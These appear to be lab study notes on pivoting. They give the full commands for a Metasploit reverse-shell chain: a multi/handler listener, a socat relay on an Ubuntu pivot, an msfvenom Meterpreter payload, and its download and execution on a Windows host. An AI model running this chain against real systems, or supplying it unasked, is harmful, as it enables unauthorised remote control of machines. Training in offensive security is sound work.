
# 🔥 CORE CONCEPT — SOCAT REDIRECTION

👉 socat is a **port redirector (relay)**

It does:

```text
Listen on one port → forward traffic to another IP:port
```

---

## 🧠 Why we use it here

Problem:

- Windows (172.16.5.19) **cannot reach your attack machine directly**
    
- It can only reach Ubuntu (pivot)
    

Solution:

- Make Ubuntu act as a **middleman redirector**
    

---

# 🔁 TRAFFIC FLOW

```text
Windows (victim)
   ↓ (connects to)
Ubuntu (socat :8080)
   ↓ (forwards to)
Attack Machine (listener :80)
```

---

# 🔥 STEP-BY-STEP EXECUTION

---

## 🔹 STEP 1 — Start listener (Attack Machine)

📍 Run on **attack machine**

```bash
msfconsole
```

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

### ✅ Why

- This is where final shell comes
    
- `0.0.0.0` → listen on all interfaces
    

---

## 🔹 STEP 2 — Start socat (Ubuntu Pivot)

📍 SSH into Ubuntu first:

```bash
ssh ubuntu@<target_ip>
```

📍 Then run:

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.15.22:80
```

---

## 🔍 What this means

```text
TCP4-LISTEN:8080 → Ubuntu listens on port 8080
fork → handle multiple connections
TCP4:10.10.15.22:80 → forward to your attack machine
```

---

## 🔹 STEP 3 — Create payload (Attack Machine)

📍 Run on **attack machine**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o shell.exe
```

---

## 🔍 Why LHOST = Ubuntu

Because:

```text
Windows → can reach Ubuntu (172.16.5.129)
Windows → cannot reach attacker directly
```

---

## 🔹 STEP 4 — Transfer payload

📍 Send to Ubuntu:

```bash
scp shell.exe ubuntu@<target_ip>:~/
```

📍 On Ubuntu:

```bash
python3 -m http.server 8123
```

---

## 🔹 STEP 5 — Download on Windows

📍 Inside RDP (Windows):

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/shell.exe" -OutFile "C:\shell.exe"
```

---

## 🔹 STEP 6 — Execute payload

📍 On Windows:

```powershell
C:\shell.exe
```

---

# 🔥 WHAT HAPPENS NOW

1. Windows connects to:
    

```text
172.16.5.129:8080  (Ubuntu)
```

2. Socat forwards:
    

```text
→ 10.10.15.22:80 (Attack machine)
```

3. Listener catches shell
